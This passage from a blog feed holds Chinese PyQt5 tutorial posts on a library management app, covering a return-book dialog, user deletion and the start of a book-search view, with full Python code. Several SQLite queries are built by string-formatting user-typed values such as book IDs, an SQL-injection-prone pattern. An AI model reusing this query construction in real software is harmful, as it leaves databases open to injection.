class="header-anchor">#</a></h3><p>一开始的时候被借书功能带偏了，依旧使用了让用户输入书号的方式，但其实使用<code>QComboBox</code>列出已借阅图书让用户选择更好，大家可以自己试试</p><p>实现逻辑如下:</p><ul><li>如果存在借阅记录，就自动匹配书籍信息</li><li>如果输入为空，给出警告</li><li>并未借阅，给出提示</li><li>更新<code>User</code>表，<code>Book</code>表以及<code>User_Book</code>表</li></ul><h3><span id="pshi-xian-dai-ma">实现代码</span><a href="#pshi-xian-dai-ma" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">import time</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class returnBookDialog(QDialog):</span><br><span class="line">    return_book_success_signal&#x3D;pyqtSignal()</span><br><span class="line">    def __init__(self, StudentId, parent&#x3D;None):</span><br><span class="line">        super(returnBookDialog, self).__init__(parent)</span><br><span class="line">        self.studentId &#x3D; StudentId</span><br><span class="line">        self.setUpUI()</span><br><span class="line">        self.setWindowModality(Qt.WindowModal)</span><br><span class="line">        self.setWindowTitle(&quot;归还书籍&quot;)</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        # 书名，书号，作者，分类，添加数量.出版社,出版日期</span><br><span class="line">        # 书籍分类：哲学类、社会科学类、政治类、法律类、军事类、经济类、文化类、教育类、体育类、语言文字类、艺术类、历史类、地理类、天文学类、生物学类、医学卫生类、农业类</span><br><span class="line">        BookCategory &#x3D; [&quot;哲学&quot;, &quot;社会科学&quot;, &quot;政治&quot;, &quot;法律&quot;, &quot;军事&quot;, &quot;经济&quot;, &quot;文化&quot;, &quot;教育&quot;, &quot;体育&quot;, &quot;语言文字&quot;, &quot;艺术&quot;, &quot;历史&quot;</span><br><span class="line">            , &quot;地理&quot;, &quot;天文学&quot;, &quot;生物学&quot;, &quot;医学卫生&quot;, &quot;农业&quot;]</span><br><span class="line">        self.resize(300, 400)</span><br><span class="line">        self.layout &#x3D; QFormLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        # Label控件</span><br><span class="line">        self.returnStudentLabel &#x3D; QLabel(&quot;还 书 人:&quot;)</span><br><span class="line">        self.returnStudentIdLabel &#x3D; QLabel(self.studentId)</span><br><span class="line">        self.titlelabel &#x3D; QLabel(&quot;  归还书籍&quot;)</span><br><span class="line">        self.bookNameLabel &#x3D; QLabel(&quot;书    名:&quot;)</span><br><span class="line">        self.bookIdLabel &#x3D; QLabel(&quot;书    号:&quot;)</span><br><span class="line">        self.authNameLabel &#x3D; QLabel(&quot;作    者:&quot;)</span><br><span class="line">        self.categoryLabel &#x3D; QLabel(&quot;分    类:&quot;)</span><br><span class="line">        self.publisherLabel &#x3D; QLabel(&quot;出 版 社:&quot;)</span><br><span class="line">        self.publishDateLabel &#x3D; QLabel(&quot;出版日期:&quot;)</span><br><span class="line"></span><br><span class="line">        # button控件</span><br><span class="line">        self.returnBookButton &#x3D; QPushButton(&quot;确认归还&quot;)</span><br><span class="line"></span><br><span class="line">        # lineEdit控件</span><br><span class="line">        self.bookNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.bookIdEdit &#x3D; QLineEdit()</span><br><span class="line">        self.authNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.categoryComboBox &#x3D; QComboBox()</span><br><span class="line">        self.categoryComboBox.addItems(BookCategory)</span><br><span class="line">        self.publisherEdit &#x3D; QLineEdit()</span><br><span class="line">        self.publishTime &#x3D; QLineEdit()</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setMaxLength(10)</span><br><span class="line">        self.bookIdEdit.setMaxLength(6)</span><br><span class="line">        self.authNameEdit.setMaxLength(10)</span><br><span class="line">        self.publisherEdit.setMaxLength(10)</span><br><span class="line"></span><br><span class="line">        # 添加进formlayout</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.titlelabel)</span><br><span class="line">        self.layout.addRow(self.returnStudentLabel, self.returnStudentIdLabel)</span><br><span class="line">        self.layout.addRow(self.bookNameLabel, self.bookNameEdit)</span><br><span class="line">        self.layout.addRow(self.bookIdLabel, self.bookIdEdit)</span><br><span class="line">        self.layout.addRow(self.authNameLabel, self.authNameEdit)</span><br><span class="line">        self.layout.addRow(self.categoryLabel, self.categoryComboBox)</span><br><span class="line">        self.layout.addRow(self.publisherLabel, self.publisherEdit)</span><br><span class="line">        self.layout.addRow(self.publishDateLabel, self.publishTime)</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.returnBookButton)</span><br><span class="line"></span><br><span class="line">        # 设置字体</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(20)</span><br><span class="line">        self.titlelabel.setFont(font)</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.returnStudentIdLabel.setFont(font)</span><br><span class="line">        font.setPixelSize(14)</span><br><span class="line">        self.returnStudentLabel.setFont(font)</span><br><span class="line">        self.bookNameLabel.setFont(font)</span><br><span class="line">        self.bookIdLabel.setFont(font)</span><br><span class="line">        self.authNameLabel.setFont(font)</span><br><span class="line">        self.categoryLabel.setFont(font)</span><br><span class="line">        self.publisherLabel.setFont(font)</span><br><span class="line">        self.publishDateLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setFont(font)</span><br><span class="line">        self.bookNameEdit.setReadOnly(True)</span><br><span class="line">        self.bookNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.bookIdEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setReadOnly(True)</span><br><span class="line">        self.authNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publisherEdit.setFont(font)</span><br><span class="line">        self.publisherEdit.setReadOnly(True)</span><br><span class="line">        self.publisherEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publishTime.setFont(font)</span><br><span class="line">        self.publishTime.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.categoryComboBox.setFont(font)</span><br><span class="line">        self.categoryComboBox.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line"></span><br><span class="line">        # button设置</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.returnBookButton.setFont(font)</span><br><span class="line">        self.returnBookButton.setFixedHeight(32)</span><br><span class="line">        self.returnBookButton.setFixedWidth(140)</span><br><span class="line"></span><br><span class="line">        # 设置间距</span><br><span class="line">        self.titlelabel.setMargin(8)</span><br><span class="line">        self.layout.setVerticalSpacing(10)</span><br><span class="line">        self.returnBookButton.clicked.connect(self.returnButtonClicked)</span><br><span class="line">        self.bookIdEdit.textChanged.connect(self.bookIdEditChanged)</span><br><span class="line"></span><br><span class="line">    def returnButtonClicked(self):</span><br><span class="line">        # 获取书号，书号为空或并未借阅，则弹出错误</span><br><span class="line">        # 更新Book_User表User表以及Book表</span><br><span class="line">        BookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        # BookId为空的处理</span><br><span class="line">        if (BookId &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;你所要还的书不存在，请查看输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        # 打开数据库</span><br><span class="line">        db &#x3D; db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        # 如果未借阅</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM User_Book WHERE StudentId&#x3D;&#39;%s&#39; AND BookId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; %(self.studentId,BookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (not query.next()):</span><br><span class="line">            print(QMessageBox.information(self, &quot;提示&quot;, &quot;您并未借阅此书，故无需归还&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        # 更新User表</span><br><span class="line">        sql &#x3D; &quot;UPDATE User SET NumBorrowed&#x3D;NumBorrowed-1 WHERE StudentId&#x3D;&#39;%s&#39;&quot; % self.studentId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        # 更新Book表</span><br><span class="line">        sql &#x3D; &quot;UPDATE Book SET NumCanBorrow&#x3D;NumCanBorrow+1 WHERE BookId&#x3D;&#39;%s&#39;&quot; % BookId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        # 更新User_Book表</span><br><span class="line">        timenow &#x3D; time.strftime(&#39;%Y-%m-%d&#39;, time.localtime(time.time()))</span><br><span class="line">        sql &#x3D; &quot;UPDATE User_Book SET ReturnTime&#x3D;&#39;%s&#39;,BorrowState&#x3D;0 WHERE StudentId&#x3D;&#39;%s&#39; AND BookId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; % (timenow,self.studentId,BookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        print(QMessageBox.information(self, &quot;提示&quot;, &quot;归还成功!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">        self.return_book_success_signal.emit()</span><br><span class="line">        self.close()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def bookIdEditChanged(self):</span><br><span class="line">        bookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        if (bookId &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            self.bookNameEdit.clear()</span><br><span class="line">            self.publisherEdit.clear()</span><br><span class="line">            self.authNameEdit.clear()</span><br><span class="line">            self.publishTime.clear()</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        # 在User_Book表中找借阅记录，如果存在借阅，则更新form内容</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM User_Book WHERE StudentId&#x3D;&#39;%s&#39; AND BookId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; % (</span><br><span class="line">            self.studentId, bookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (query.next()):</span><br><span class="line">            # 更新form内容</span><br><span class="line">            sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">            query.exec_(sql)</span><br><span class="line">            # 查询对应书号，如果存在就更新form</span><br><span class="line">            if (query.next()):</span><br><span class="line">                self.bookNameEdit.setText(query.value(0))</span><br><span class="line">                self.authNameEdit.setText(query.value(2))</span><br><span class="line">                self.categoryComboBox.setCurrentText(query.value(3))</span><br><span class="line">                self.publisherEdit.setText(query.value(4))</span><br><span class="line">                self.publishTime.setText(query.value(5))</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; returnBookDialog(&quot;PB15000135&quot;)</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135713.jpg" alt="这里写图片描述"><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135717.jpg" alt="这里写图片描述"><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135724.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（7）——用户管理</title>
    <url>/f6234a21.html</url>
    <content><![CDATA[<h2><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>对于用户管理，本来应该包含添加用户，删除用户等操作的，但是为了实现简单，添加用户就用注册代替了，所以所谓用户管理，只是实现了用户的删除操作</p><p>为了删除用户的同时保护数据库的完整性和约束，需要进行以下操作</p><ul><li>从<code>User</code>表删除该用户</li><li>将该用户所借阅的所有书籍全部归还</li></ul><a id="more"></a><h2><span id="pdai-ma-shi-xian">代码实现</span><a href="#pdai-ma-shi-xian" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line">import time</span><br><span class="line">import sip</span><br><span class="line"></span><br><span class="line">class UserManage(QDialog):</span><br><span class="line">    def __init__(self,parent&#x3D;None):</span><br><span class="line">        super(UserManage, self).__init__(parent)</span><br><span class="line">        self.resize(280, 400)</span><br><span class="line">        self.layout &#x3D; QVBoxLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line">        self.setWindowTitle(&quot;管理用户&quot;)</span><br><span class="line">        # 用户数</span><br><span class="line">        self.userCount &#x3D; 0</span><br><span class="line">        self.oldDeleteId &#x3D; &quot;&quot;</span><br><span class="line">        self.oldDeleteName &#x3D; &quot;&quot;</span><br><span class="line">        self.deleteId &#x3D; &quot;&quot;</span><br><span class="line">        self.deleteName &#x3D; &quot;&quot;</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        self.db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        self.db.open()</span><br><span class="line">        self.query &#x3D; QSqlQuery()</span><br><span class="line">        self.getResult()</span><br><span class="line"></span><br><span class="line">        # 表格设置</span><br><span class="line">        self.tableWidget &#x3D; QTableWidget()</span><br><span class="line">        self.tableWidget.setRowCount(self.userCount)</span><br><span class="line">        self.tableWidget.setColumnCount(2)</span><br><span class="line">        self.tableWidget.setHorizontalHeaderLabels([&#39;学号&#39;, &#39;姓名&#39;])</span><br><span class="line">        # 不可编辑</span><br><span class="line">        self.tableWidget.setEditTriggers(QAbstractItemView.NoEditTriggers)</span><br><span class="line">        # 标题可拉伸</span><br><span class="line">        self.tableWidget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)</span><br><span class="line">        # 整行选中</span><br><span class="line">        self.tableWidget.setSelectionBehavior(QAbstractItemView.SelectRows)</span><br><span class="line"></span><br><span class="line">        self.layout.addWidget(self.tableWidget)</span><br><span class="line">        self.setRows()</span><br><span class="line">        self.deleteUserButton &#x3D; QPushButton(&quot;删 除 用 户&quot;)</span><br><span class="line">        hlayout &#x3D; QHBoxLayout()</span><br><span class="line">        hlayout.addWidget(self.deleteUserButton, Qt.AlignHCenter)</span><br><span class="line">        self.widget &#x3D; QWidget()</span><br><span class="line">        self.widget.setLayout(hlayout)</span><br><span class="line">        self.widget.setFixedHeight(48)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(15)</span><br><span class="line">        self.deleteUserButton.setFixedHeight(36)</span><br><span class="line">        self.deleteUserButton.setFixedWidth(180)</span><br><span class="line">        self.deleteUserButton.setFont(font)</span><br><span class="line">        self.layout.addWidget(self.widget, Qt.AlignCenter)</span><br><span class="line">        # 设置信号</span><br><span class="line">        self.deleteUserButton.clicked.connect(self.deleteUser)</span><br><span class="line">        self.tableWidget.itemClicked.connect(self.getStudentInfo)</span><br><span class="line"></span><br><span class="line">    def getResult(self):</span><br><span class="line">        sql &#x3D; &quot;SELECT StudentId,Name FROM User WHERE IsAdmin&#x3D;0&quot;</span><br><span class="line">        self.query.exec_(sql)</span><br><span class="line">        self.userCount &#x3D; 0;</span><br><span class="line">        while (self.query.next()):</span><br><span class="line">            self.userCount +&#x3D; 1;</span><br><span class="line">        sql &#x3D; &quot;SELECT StudentId,Name FROM User WHERE IsAdmin&#x3D;0&quot;</span><br><span class="line">        self.query.exec_(sql)</span><br><span class="line"></span><br><span class="line">    def setRows(self):</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(14)</span><br><span class="line">        for i in range(self.userCount):</span><br><span class="line">            if (self.query.next()):</span><br><span class="line">                StudentIdItem &#x3D; QTableWidgetItem(self.query.value(0))</span><br><span class="line">                StudentNameItem &#x3D; QTableWidgetItem(self.query.value(1))</span><br><span class="line">                StudentIdItem.setFont(font)</span><br><span class="line">                StudentNameItem.setFont(font)</span><br><span class="line">                StudentIdItem.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)</span><br><span class="line">                StudentNameItem.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)</span><br><span class="line">                self.tableWidget.setItem(i, 0, StudentIdItem)</span><br><span class="line">                self.tableWidget.setItem(i, 1, StudentNameItem)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def getStudentInfo(self, item):</span><br><span class="line">        row &#x3D; self.tableWidget.currentIndex().row()</span><br><span class="line">        self.tableWidget.verticalScrollBar().setSliderPosition(row)</span><br><span class="line">        self.getResult()</span><br><span class="line">        i &#x3D; 0</span><br><span class="line">        while (self.query.next() and i !&#x3D; row):</span><br><span class="line">            i &#x3D; i + 1</span><br><span class="line">        self.oldDeleteId &#x3D; self.deleteId</span><br><span class="line">        self.oldDeleteName &#x3D; self.deleteName</span><br><span class="line">        self.deleteId &#x3D; self.query.value(0)</span><br><span class="line">        self.deleteName &#x3D; self.query.value(1)</span><br><span class="line"></span><br><span class="line">    def deleteUser(self):</span><br><span class="line">        if (self.deleteId &#x3D;&#x3D; &quot;&quot; and self.deleteName &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;请选中要删除的用户&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        elif (self.deleteId &#x3D;&#x3D; self.oldDeleteId and self.deleteName &#x3D;&#x3D; self.oldDeleteName):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;请选中要删除的用户&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        if (QMessageBox.information(self, &quot;提醒&quot;, &quot;删除用户:%s,%s\n用户一经删除将无法恢复，是否继续?&quot; % (self.deleteId, self.deleteName),</span><br><span class="line">                                    QMessageBox.Yes | QMessageBox.No,</span><br><span class="line">                                    QMessageBox.No) &#x3D;&#x3D; QMessageBox.No):</span><br><span class="line">            return</span><br><span class="line">        # 从User表删除用户</span><br><span class="line">        sql &#x3D; &quot;DELETE FROM User WHERE StudentId&#x3D;&#39;%s&#39;&quot; % (self.deleteId)</span><br><span class="line">        self.query.exec_(sql)</span><br><span class="line">        self.db.commit()</span><br><span class="line">        # 归还所有书籍</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM User_Book  WHERE StudentId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; % self.deleteId</span><br><span class="line">        self.query.exec_(sql)</span><br><span class="line">        timenow &#x3D; time.strftime(&#39;%Y-%m-%d&#39;, time.localtime(time.time()))</span><br><span class="line">        updateQuery&#x3D;QSqlQuery()</span><br><span class="line">        while (self.query.next()):</span><br><span class="line">            bookId&#x3D;self.query.value(1)</span><br><span class="line">            sql&#x3D;&quot;UPDATE Book SET NumCanBorrow&#x3D;NumCanBorrow+1 WHERE BookId&#x3D;&#39;%s&#39;&quot;% bookId</span><br><span class="line">            updateQuery.exec_(sql)</span><br><span class="line">            self.db.commit()</span><br><span class="line">        sql&#x3D;&quot;UPDATE User_Book SET ReturnTime&#x3D;&#39;%s&#39;,BorrowState&#x3D;0 WHERE StudentId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot;%(timenow,self.deleteId)</span><br><span class="line">        self.query.exec_(sql)</span><br><span class="line">        self.db.commit()</span><br><span class="line">        print(QMessageBox.information(self,&quot;提醒&quot;,&quot;删除用户成功!&quot;,QMessageBox.Yes,QMessageBox.Yes))</span><br><span class="line">        self.updateUI()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def updateUI(self):</span><br><span class="line">        self.getResult()</span><br><span class="line">        self.layout.removeWidget(self.widget)</span><br><span class="line">        self.layout.removeWidget(self.tableWidget)</span><br><span class="line">        sip.delete(self.widget)</span><br><span class="line">        sip.delete(self.tableWidget)</span><br><span class="line">        # 表格设置</span><br><span class="line">        self.tableWidget &#x3D; QTableWidget()</span><br><span class="line">        self.tableWidget.setRowCount(self.userCount)</span><br><span class="line">        self.tableWidget.setColumnCount(2)</span><br><span class="line">        self.tableWidget.setHorizontalHeaderLabels([&#39;学号&#39;, &#39;姓名&#39;])</span><br><span class="line">        # 不可编辑</span><br><span class="line">        self.tableWidget.setEditTriggers(QAbstractItemView.NoEditTriggers)</span><br><span class="line">        # 标题可拉伸</span><br><span class="line">        self.tableWidget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)</span><br><span class="line">        # 整行选中</span><br><span class="line">        self.tableWidget.setSelectionBehavior(QAbstractItemView.SelectRows)</span><br><span class="line"></span><br><span class="line">        self.layout.addWidget(self.tableWidget)</span><br><span class="line">        self.setRows()</span><br><span class="line">        self.deleteUserButton &#x3D; QPushButton(&quot;删 除 用 户&quot;)</span><br><span class="line">        hlayout &#x3D; QHBoxLayout()</span><br><span class="line">        hlayout.addWidget(self.deleteUserButton, Qt.AlignHCenter)</span><br><span class="line">        self.widget &#x3D; QWidget()</span><br><span class="line">        self.widget.setLayout(hlayout)</span><br><span class="line">        self.widget.setFixedHeight(48)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(15)</span><br><span class="line">        self.deleteUserButton.setFixedHeight(36)</span><br><span class="line">        self.deleteUserButton.setFixedWidth(180)</span><br><span class="line">        self.deleteUserButton.setFont(font)</span><br><span class="line">        self.layout.addWidget(self.widget, Qt.AlignCenter)</span><br><span class="line">        # 设置信号</span><br><span class="line">        self.deleteUserButton.clicked.connect(self.deleteUser)</span><br><span class="line">        self.tableWidget.itemClicked.connect(self.getStudentInfo)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; UserManage()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h2><span id="pdai-ma-fen-xi">代码分析</span><a href="#pdai-ma-fen-xi" class="header-anchor">#</a></h2><p>这里使用	<code>QtableWidget</code>来展示当前所有的用户的学号以及姓名<br>步骤如下：</p><ul><li>展示所有用户</li><li>管理员选中一行</li><li>点击删除用户</li><li>提醒时候确认删除</li><li>删除，同时刷新展示的数据</li></ul><h2><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h2><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135633.jpg" alt="这里写图片描述"><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135639.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（6）——书籍信息查询实现</title>
    <url>/ec62120c.html</url>
    <content><![CDATA[<h2><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>从数据库的设计可以看到，在这里我们只需要使用Book表的数据，就可以实现书籍信息的查询了</p><p>在这个功能的实现上，可以说花了我比较大的心思了，主要实现了这些功能：</p><ul><li>动态刷新，也就是说当管理员删除或者添加书籍，用户借阅归还书籍的时候动态刷新这个TableView</li><li>模糊匹配</li><li>按书名，作者，书号，出版社查询</li><li>跳转页，翻页</li></ul><a id="more"></a><h2><span id="pdai-ma-shi-xian">代码实现</span><a href="#pdai-ma-shi-xian" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import Qt</span><br><span class="line">import qdarkstyle</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BookStorageViewer(QWidget):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super(BookStorageViewer, self).__init__()</span><br><span class="line">        self.resize(700, 500)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        # 查询模型</span><br><span class="line">        self.queryModel &#x3D; None</span><br><span class="line">        # 数据表</span><br><span class="line">        self.tableView &#x3D; None</span><br><span class="line">        # 当前页</span><br><span class="line">        self.currentPage &#x3D; 0</span><br><span class="line">        # 总页数</span><br><span class="line">        self.totalPage &#x3D; 0</span><br><span class="line">        # 总记录数</span><br><span class="line">        self.totalRecord &#x3D; 0</span><br><span class="line">        # 每页数据数</span><br><span class="line">        self.pageRecord &#x3D; 10</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.layout &#x3D; QVBoxLayout()</span><br><span class="line">        self.Hlayout1 &#x3D; QHBoxLayout()</span><br><span class="line">        self.Hlayout2 &#x3D; QHBoxLayout()</span><br><span class="line"></span><br><span class="line">        # Hlayout1控件的初始化</span><br><span class="line">        self.searchEdit &#x3D; QLineEdit()</span><br><span class="line">        self.searchEdit.setFixedHeight(32)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(15)</span><br><span class="line">        self.searchEdit.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.searchButton &#x3D; QPushButton(&quot;查询&quot;)</span><br><span class="line">        self.searchButton.setFixedHeight(32)</span><br><span class="line">        self.searchButton.setFont(font)</span><br><span class="line">        self.searchButton.setIcon(QIcon(QPixmap(&quot;.&#x2F;images&#x2F;search.png&quot;)))</span><br><span class="line"></span><br><span class="line">        self.condisionComboBox &#x3D; QComboBox()</span><br><span class="line">        searchCondision &#x3D; [&#39;按书名查询&#39;, &#39;按书号查询&#39;, &#39;按作者查询&#39;, &#39;按分类查询&#39;, &#39;按出版社查询&#39;]</span><br><span class="line">        self.condisionComboBox.setFixedHeight(32)</span><br><span class="line">        self.condisionComboBox.setFont(font)</span><br><span class="line">        self.condisionComboBox.addItems(searchCondision)</span><br><span class="line"></span><br><span class="line">        self.Hlayout1.addWidget(self.searchEdit)</span><br><span class="line">        self.Hlayout1.addWidget(self.searchButton)</span><br><span class="line">        self.Hlayout1.addWidget(self.condisionComboBox)</span><br><span class="line"></span><br><span class="line">        # Hlayout2初始化</span><br><span class="line">        self.jumpToLabel &#x3D; QLabel(&quot;跳转到第&quot;)</span><br><span class="line">        self.pageEdit &#x3D; QLineEdit()</span><br><span class="line">        self.pageEdit.setFixedWidth(30)</span><br><span class="line">        s &#x3D; &quot;&#x2F;&quot; + str(self.totalPage) + &quot;页&quot;</span><br><span class="line">        self.pageLabel &#x3D; QLabel(s)</span><br><span class="line">        self.jumpToButton &#x3D; QPushButton(&quot;跳转&quot;)</span><br><span class="line">        self.prevButton &#x3D; QPushButton(&quot;前一页&quot;)</span><br><span class="line">        self.prevButton.setFixedWidth(60)</span><br><span class="line">        self.backButton &#x3D; QPushButton(&quot;后一页&quot;)</span><br><span class="line">        self.backButton.setFixedWidth(60)</span><br><span class="line"></span><br><span class="line">        Hlayout &#x3D; QHBoxLayout()</span><br><span class="line">        Hlayout.addWidget(self.jumpToLabel)</span><br><span class="line">        Hlayout.addWidget(self.pageEdit)</span><br><span class="line">        Hlayout.addWidget(self.pageLabel)</span><br><span class="line">        